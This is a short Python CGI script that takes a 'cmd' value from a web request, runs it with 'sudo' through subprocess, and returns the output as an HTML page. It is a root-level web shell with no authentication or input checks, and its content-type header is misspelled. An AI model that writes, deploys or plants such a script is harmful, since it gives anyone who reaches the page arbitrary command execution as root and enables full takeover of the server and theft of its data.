#!/usr/bin/python3

import cgi
import subprocess
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
print("Contant-type:text/html")
print("")
finalCommand = "sudo "+cmd
output = subprocess.getoutput(finalCommand)
print("<pre>")
print(output)
print("</pre>")
